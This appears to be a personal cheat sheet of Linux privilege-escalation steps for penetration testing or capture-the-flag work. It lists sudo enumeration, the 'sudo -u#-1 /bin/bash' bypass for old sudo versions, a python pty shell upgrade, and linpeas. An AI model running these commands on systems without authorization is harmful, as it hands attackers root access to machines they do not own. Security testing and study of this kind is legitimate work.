# Linux Privilege Escalation

## Useful commands
- List files resursively: `ls -halR`

## Low Hanging Fruit
- Check the user's sudo rights: `sudo -l` > https://gtfobins.org
  - If user is allowed to run ALL, use `sudo su` to get a root shell
- Check sudo version: `sudo -V`
  - Below 1.28? > `sudo -u#-1 /bin/bash`

## Checklist
- Spawning interactive terminal: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- Run linpeas.sh
  - Location on Kali: `/usr/share/peass/linpeas/linpeas.sh`
- Check aliases: `cat /home/remi/.bash_aliases` `alias`
